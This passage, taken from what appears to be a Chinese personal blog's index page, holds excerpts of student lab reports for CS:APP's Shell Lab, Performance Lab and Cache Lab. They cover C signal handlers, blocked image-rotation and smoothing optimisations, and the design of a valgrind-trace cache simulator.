class="comment">/* remove the job in job list accordingly */</span></span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <span class="comment">/* block all signal in case the race between SIGINT and SIGCHLD */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    Kill(-pid, SIGINT); <span class="comment">/* kill processes in fg job's process group */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, pid2jid(pid), pid, sig); <span class="comment">/* print the message */</span></span><br><span class="line"></span><br><span class="line">    deletejob(jobs, pid); <span class="comment">/* delete job in joblist */</span></span><br><span class="line"></span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <span class="comment">/* block all signal in case the race between SIGTSTP and SIGCHLD */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    pid = fgpid(jobs);</span><br><span class="line">    Kill(-pid, SIGTSTP); <span class="comment">/* send SIGTSTP to fg job's process group */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, pid2jid(pid), pid, sig); <span class="comment">/* print the message */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">stpjob</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    stpjob-&gt;state = ST; <span class="comment">/* modify the job list */</span></span><br><span class="line"></span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>总的来说不难的一个实验，关键在于要先理解整个框架中的代码，然后根据trace file渐进地完成程序。需要注意的地方实验讲义中的提示以及书本中都已经给出，这里不再赘述。需要强调的是SIGCHLD的信号处理程序需要处理未捕获的SIGTSTP和SIGINT信号。此外SIGINT/SIGTSTP和SIGCHLD的信号处理程序之间可能会有潜在的导致错误的冲突。（信号处理程序是可以被其他信号中断的，可以见trace16.txt）</p>
<p>此外，handler中的printf是异步不安全的，不推荐使用。以及书本中虽然使用了sigsuspend来实行同步，但是为了简化程序，根据实验讲义的提示，使用了忙循环处理前台等待，并且将回收僵死进程任务交给了sigchld_handler。这些都是本次实验中不足和可以修改的地方。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/08/01/深入理解计算机系统ShellLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/07/20/深入理解计算机系统PerformanceLab实验报告/">
                            深入理解计算机系统PerformanceLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-07-20T01:23:51+08:00">
	
		    7月 20, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/PerformanceLab" target="_blank" rel="noopener">GitHub</a>上</p>
<blockquote>
<p>由于Cache Lab的Part B的64 × 64的矩阵一直拿不到满分，索性放在了一边，先从老的Performance Lab开始做起。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Performance Lab - Code Optimization是有关性能优化的实验，对应于书本的第5章：优化程序性能和第6章：存储器层次结构。主要提供了利用书本所学的知识优化代码的机会。</p>
<p>本实验主要分为两个部分，每个部分分别对于一个简单的图像处理函数进行优化。第一个部分所优化的函数旋转(rotate)对于缓存更加敏感，而第二个部分所优化的函数平滑(smooth)则属于计算密集型函数。对它们优化的侧重是有所不同的。</p>
<p>本实验的具体介绍见<a href="http://csapp.cs.cmu.edu/3e/perflab.pdf" target="_blank" rel="noopener">实验讲义</a>。</p>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本实验中，我们将实现两个图像处理函数——旋转和平滑。</p>
<p>我们将一张图片抽象地表示为一个二维矩阵M，M(i, j)代表了M中第i行第j列的像素的值，该像素值被定义为红色、绿色、蓝色（RGB）的值的三元组。在本实验中，我们只考虑正方形的图片。下标遵循C语言风格，从0到N-1。</p>
<p>旋转操作被定义为将图片逆时针旋转90°，旋转可以分为两步实现——</p>
<ol>
<li>将矩阵转置，即将M(i, j)变为M(j, i)</li>
<li>将矩阵的第i行和第N - i - 1交换</li>
</ol>
<p>平滑操作被定义为将每一个像素点的值换位周围像素点（以该像素点为中心的最多3*3的正方形）的平均值。</p>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>在本实验中像素（pixel）是一个定义如下的结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">The core data structure deals with image representation. A pixel is a <span class="class"><span class="keyword">struct</span> <span class="title">as</span> <span class="title">shown</span> <span class="title">below</span>:</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> red;    <span class="comment">/* R value */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> green;  <span class="comment">/* G value */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> blue;   <span class="comment">/* B value */</span></span><br><span class="line">&#125; pixel;</span><br></pre></td></tr></table></figure></p>
<p>此外，为了简化起见，还定义了如下的宏：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIDX(i,j,n) ((i)*(n)+(j))</span></span><br></pre></td></tr></table></figure></p>
<p>旋转操作的朴素版本如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">naive_rotate</span><span class="params">(<span class="keyword">int</span> dim, pixel *src, pixel *dst)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; dim; i++)</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; dim; j++)</span><br><span class="line">            dst[RIDX(dim<span class="number">-1</span>-j,i,dim)] = src[RIDX(i,j,dim)];</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>平滑操作的朴素版本如下（辅助函数未列出）：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">naive_smooth</span><span class="params">(<span class="keyword">int</span> dim, pixel *src, pixel *dst)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; dim; i++)</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; dim; j++)</span><br><span class="line">            dst[RIDX(i,j,dim)] = avg(dim, i, j, src); <span class="comment">/* Smooth the (i,j)th pixel */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>为了简化起见，你可以假设所有的矩阵的边长都是32的倍数，并且在进行正确性测试的时候，只会测试5个值。</p>
<p>具体的注册函数和自动跑分机制请参阅实验讲义。</p>
<h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><p>旋转操作：旋转操作不涉及复杂的计算，经过测试将代码移动所带来的性能提升微乎其微。主要应当采用分块的手段提高代码的空间局部性的利用率。</p>
<p>平滑操作（平滑操作参考了别人的思路）：平滑操作是计算密集型函数，经过测试，通过减少过程调用以及代码移动带来的有限的性能提升。<br>观察原始代码可以发现分支预测的惩罚是巨大的（因为循环只会执行3次，会带来大量的预测不命中）。我们可以考虑将红、绿、蓝三色的值的计算分开地并行处理，并且依次处理四个角、四条边、和剩余的像素点。以提升局部性的利用率并且降低分支预测不命中所带来的惩罚。</p>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><p>旋转操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">block_rotate</span><span class="params">(<span class="keyword">int</span> dim, pixel * src, pixel * dst)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, l;</span><br><span class="line">    <span class="keyword">int</span> cst0 = dim - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; dim ; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span> ; j &lt; dim ; j += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (k = i ; k &lt; i + <span class="number">8</span> ; k++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (l = j ; l &lt; j + <span class="number">8</span> ; l++) &#123;</span><br><span class="line">                    dst[RIDX(cst0 - l, k, dim)] = src[RIDX(k, l, dim)];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>平滑操作：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">optimized_smooth</span><span class="params">(<span class="keyword">int</span> dim, pixel * src, pixel * dst)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> tmp;</span><br><span class="line"></span><br><span class="line">    dst[<span class="number">0</span>].red = (src[<span class="number">0</span>].red + src[<span class="number">1</span>].red + src[dim].red + src[dim + <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[<span class="number">0</span>].green = (src[<span class="number">0</span>].green + src[<span class="number">1</span>].green + src[dim].green + src[dim + <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[<span class="number">0</span>].blue = (src[<span class="number">0</span>].blue + src[<span class="number">1</span>].blue + src[dim].blue + src[dim + <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    i = dim - <span class="number">1</span>;</span><br><span class="line">    dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + dim].red + src[i + dim <span class="number">-1</span>].red) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + dim].green + src[i + dim <span class="number">-1</span>].green) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + dim].blue + src[i + dim <span class="number">-1</span>].blue) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    i = i * dim;</span><br><span class="line">    dst[i].red = (src[i].red + src[i + <span class="number">1</span>].red + src[i - dim].red + src[i - dim + <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[i].green = (src[i].green + src[i + <span class="number">1</span>].green + src[i - dim].green + src[i - dim + <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[i].blue = (src[i].blue + src[i + <span class="number">1</span>].blue + src[i - dim].blue + src[i - dim + <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    i = i + dim - <span class="number">1</span>;</span><br><span class="line">    dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i - dim].red + src[i - dim - <span class="number">1</span>].red) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i - dim].green + src[i - dim - <span class="number">1</span>].green) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i - dim].blue + src[i - dim - <span class="number">1</span>].blue) &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span> ; i &lt; dim - <span class="number">1</span> ; i++) &#123;</span><br><span class="line">        dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + <span class="number">1</span>].red + src[i + dim].red + src[i + dim - <span class="number">1</span>].red + src[i + dim + <span class="number">1</span>].red) / <span class="number">6</span>;</span><br><span class="line">        dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + <span class="number">1</span>].green + src[i + dim].green + src[i + dim - <span class="number">1</span>].green + src[i + dim + <span class="number">1</span>].green) / <span class="number">6</span>;</span><br><span class="line">        dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + <span class="number">1</span>].blue + src[i + dim].blue + src[i + dim - <span class="number">1</span>].blue + src[i + dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = dim * (dim - <span class="number">1</span>) + <span class="number">1</span> ; i &lt; dim * dim - <span class="number">1</span> ; i++) &#123;</span><br><span class="line">        dst[i].red = (src[i].red + src[i - <span class="number">1</span>].red + src[i + <span class="number">1</span>].red + src[i - dim].red + src[i - dim - <span class="number">1</span>].red + src[i - dim + <span class="number">1</span>].red) / <span class="number">6</span>;</span><br><span class="line">        dst[i].green = (src[i].green + src[i - <span class="number">1</span>].green + src[i + <span class="number">1</span>].green + src[i - dim].green + src[i - dim - <span class="number">1</span>].green + src[i - dim + <span class="number">1</span>].green) / <span class="number">6</span>;</span><br><span class="line">        dst[i].blue = (src[i].blue + src[i - <span class="number">1</span>].blue + src[i + <span class="number">1</span>].blue+ src[i - dim].blue + src[i - dim - <span class="number">1</span>].blue+ src[i - dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (j = dim ; j &lt; dim * (dim - <span class="number">1</span>) ; j+= dim) &#123;</span><br><span class="line">        dst[j].red = (src[j].red + src[j + <span class="number">1</span>].red + src[j - dim].red + src[j - dim + <span class="number">1</span>].red + src[j + dim].red + src[j + dim + <span class="number">1</span>].red) / <span class="number">6</span>;</span><br><span class="line">        dst[j].green = (src[j].green + src[j + <span class="number">1</span>].green + src[j - dim].green+ src[j - dim + <span class="number">1</span>].green + src[j + dim].green + src[j + dim + <span class="number">1</span>].green) / <span class="number">6</span>;</span><br><span class="line">        dst[j].blue = (src[j].blue + src[j + <span class="number">1</span>].blue + src[j - dim].blue + src[j - dim + <span class="number">1</span>].blue + src[j + dim].blue + src[j + dim + <span class="number">1</span>].blue) / <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">2</span> * dim - <span class="number">1</span> ; j &lt; dim * dim - <span class="number">1</span> ; j += dim) &#123;</span><br><span class="line">        dst[j].red = (src[j].red + src[j - <span class="number">1</span>].red + src[j - dim].red + src[j - dim - <span class="number">1</span>].red + src[j + dim].red + src[j + dim - <span class="number">1</span>].red) / <span class="number">6</span>;</span><br><span class="line">        dst[j].green = (src[j].green + src[j - <span class="number">1</span>].green + src[j - dim].green + src[j - dim - <span class="number">1</span>].green + src[j + dim].green + src[j + dim - <span class="number">1</span>].green) / <span class="number">6</span>;</span><br><span class="line">        dst[j].blue = (src[j].blue + src[j - <span class="number">1</span>].blue + src[j - dim].blue + src[j - dim - <span class="number">1</span>].blue + src[j + dim].blue + src[j + dim - <span class="number">1</span>].blue) / <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span> ; i &lt; dim - <span class="number">1</span> ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span> ; j &lt; dim - <span class="number">1</span> ; j++) &#123;</span><br><span class="line">            tmp = i * dim + j;</span><br><span class="line">            dst[tmp].red = (src[tmp].red + src[tmp - <span class="number">1</span>].red + src[tmp + <span class="number">1</span>].red + src[tmp - dim].red + src[tmp - dim - <span class="number">1</span>].red + src[tmp - dim + <span class="number">1</span>].red + src[tmp + dim].red + src[tmp + dim - <span class="number">1</span>].red + src[tmp + dim + <span class="number">1</span>].red) / <span class="number">9</span>;</span><br><span class="line">            dst[tmp].green = (src[tmp].green + src[tmp - <span class="number">1</span>].green + src[tmp + <span class="number">1</span>].green + src[tmp - dim].green + src[tmp - dim - <span class="number">1</span>].green + src[tmp - dim + <span class="number">1</span>].green + src[tmp + dim].green + src[tmp + dim - <span class="number">1</span>].green + src[tmp + dim + <span class="number">1</span>].green) / <span class="number">9</span>;</span><br><span class="line">            dst[tmp].blue = (src[tmp].blue + src[tmp - <span class="number">1</span>].blue + src[tmp + <span class="number">1</span>].blue + src[tmp - dim].blue + src[tmp - dim - <span class="number">1</span>].blue + src[tmp - dim + <span class="number">1</span>].blue + src[tmp + dim].blue + src[tmp + dim - <span class="number">1</span>].blue + src[tmp + dim + <span class="number">1</span>].blue) / <span class="number">9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>实验的第一部分对于缓存的要求不是很高，简单的分块可以带来很大的性能提升。</p>
<p>实验的第二部分实际上我是卡了比较久的，在发现减少过程调用和代码移动性能提升有限后我就卡住了，因为我发现似乎无法进行循环展开。实际上还是太生疏了，没有想到要分析性能瓶颈，最后参考了别人的答案，实际上看到了别人答案的一瞬间就豁然开朗了，但是在这之前完全没有想到会是分支预测的问题。还需要多加练习。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/07/20/深入理解计算机系统PerformanceLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/07/08/深入理解计算机系统CacheLab-PartA实验报告/">
                            深入理解计算机系统CacheLab-PartA实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-07-08T17:55:51+08:00">
	
		    7月 08, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab" target="_blank" rel="noopener">GitHub</a>上</p>
<blockquote>
<p>考完试之后一直比较颓废，本来想看完《深入理解计算机系统》的第5章——优化程序性能之后就赶快来做实验的，后来发现无论是Cache Lab还是Performance Lab都需要第6章——存储器层次结构的知识。看了几天的书，又磨蹭了几天，终于把Cache Lab的Part A写完了，总结如下。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Cache Lab - Understanding Cache Memories主要是有关缓存的实验，对应于书本的第6章：存储器层次结构。主要阐明了缓存对于C语言程序的性能影响。</p>
<p>本实验主要分为两个部分。第一个部分要求完成一个C语言程序用来模拟缓存的行为；而第二个部分要求优化一个小的矩阵变换函数，使其具有尽可能小的缓存不命中率。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/archlab32-handout.tar" target="_blank" rel="noopener">实验讲义</a>。</p>
<h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>实验讲义中的traces子文件夹下包含了一组reference trace files，用来作为评估Part A中缓存模拟器正确性的样例数据。这些文件是由valgrind生成的。</p>
<p>Valgrind是一个用于内存调试，内存泄露以及性能分析的软件。例如，我们输入如下的命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux&gt; valgrind --<span class="built_in">log</span>-fd=1 --tool=lackey -v --trace-mem=yes ls -l</span><br></pre></td></tr></table></figure><br>valgrind会在命令行中执行ls -l命令并且按照顺序记录该命令的每一次内存访问，并且将其输出到标准输出流中。</p>
<p>下面是一个valgrind的输出样例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line"> M 0421c7f0,4</span><br><span class="line"> L 04f6b868,8</span><br><span class="line"> S 7ff0005c8,8</span><br></pre></td></tr></table></figure></p>
<p>每一行的基本格式如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[空格]操作 地址,大小</span><br></pre></td></tr></table></figure><br>操作代表了内存访问的种类，<code>&#39;I&#39;</code>代表的是指令加载，<code>&#39;L&#39;</code>代表的是数据加载，<code>&#39;S&#39;</code>代表的是数据存储，<code>&#39;M&#39;</code>代表的是数据修改（如一条数据加载之后紧跟着数据存储）。在<code>&#39;I&#39;</code>之前永远没有空格，而其他的操作前必定有前置空格。<br>地址代表的是一个64位的16进制内存地址。<br>大小指明了该次内存访问涉及的字节数。</p>
<h2 id="实验要求-Part-A"><a href="#实验要求-Part-A" class="headerlink" title="实验要求 - Part A"></a>实验要求 - Part A</h2><p>在Part A中你需要在csim.c中实现一个LRU驱逐机制的缓存模拟器，该模拟器接收valgrind的trace作为输入，模拟一个缓存在该情况下的命中/不命中情况，并且输出所有的命中，不命中以及驱逐的次数。</p>
<p>本实验已经提供了一个用来参考的缓存模拟器csim-ref，其使用方式以及输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br><span class="line">• -h: Optional <span class="built_in">help</span> flag that prints usage info</span><br><span class="line">• -v: Optional verbose flag that displays trace info</span><br><span class="line">• -s &lt;s&gt;: Number of <span class="built_in">set</span> index bits (S = 2 s is the number of sets)</span><br><span class="line">• -E &lt;E&gt;: Associativity (number of lines per <span class="built_in">set</span>)</span><br><span class="line">• -b &lt;b&gt;: Number of block bits (B = 2 b is the block size)</span><br><span class="line">• -t &lt;tracefile&gt;: Name of the valgrind trace to replay</span><br><span class="line"></span><br><span class="line">linux&gt; ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace</span><br><span class="line">hits:4 misses:5 evictions:3</span><br><span class="line"></span><br><span class="line">linux&gt; ./csim-ref -v -s 4 -E 1 -b 4 -t traces/yi.trace</span><br><span class="line">L 10,1 miss</span><br><span class="line">M 20,1 miss hit</span><br><span class="line">L 22,1 hit</span><br><span class="line">S 18,1 hit</span><br><span class="line">L 110,1 miss eviction</span><br><span class="line">L 210,1 miss eviction</span><br><span class="line">M 12,1 miss eviction hit</span><br><span class="line">hits:4 misses:5 evictions:3</span><br></pre></td></tr></table></figure></p>
<p>对于Part A有以下的要求和限制：</p>
<ol>
<li>所写的程序编译时不能有任何的警告</li>
<li>能应对不同s，E和b的缓存生成对应的结果，这要求使用malloc来为你的数据结构分配空间</li>
<li>不需要考虑指令加载的缓存情况</li>
<li>调用printSummary打印最终的结果</li>
<li>假定数据已经适当对齐，不会出现一次数据加载跨区块的情况。这样，你可以忽略trace中的大小</li>
</ol>
<p>除此以外，实验的自学者讲义中还包含了一些提示，这里就不再赘述。</p>
<p>完成了Part A之后，可以用<code>make clean &amp;&amp; make</code>进行编译，并且用<code>./test-csim</code>进行自动评分，总共有8组样例，共27分满分。</p>
<h2 id="实验过程-Part-A"><a href="#实验过程-Part-A" class="headerlink" title="实验过程 - Part A"></a>实验过程 - Part A</h2><h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><p>整个模拟器在思路上可以进行如下的拆分：</p>
<h4 id="1-命令行参数解析"><a href="#1-命令行参数解析" class="headerlink" title="1.命令行参数解析"></a>1.命令行参数解析</h4><p>由于该模拟器是命令行程序并且接受命令行参数，因此需要能对命令行参数进行解析和处理，这里推荐使用getopt进行参数的解析。并且根据不同的参数执行不同的控制流，并且处理一些基本的错误如参数缺失以及参数类型错误。</p>
<h4 id="2-数据结构"><a href="#2-数据结构" class="headerlink" title="2.数据结构"></a>2.数据结构</h4><p>这是整个模拟器最基本的部分。我们需要创建合适的数据结构来模拟缓存，该数据结构不仅要能模拟缓存的数据的实际组织方式（有效位，标志位以及行和块等等），还需要考虑到LRU的驱逐机制。</p>
<h4 id="3-文件中内存访问记录的处理和解析"><a href="#3-文件中内存访问记录的处理和解析" class="headerlink" title="3.文件中内存访问记录的处理和解析"></a>3.文件中内存访问记录的处理和解析</h4><p>这个是模拟器中核心的部分。模拟器的功能就是从文件中接收内存访问记录，并且根据这些记录来模拟缓存的行为，操作我们所设计的缓存的数据结构。</p>
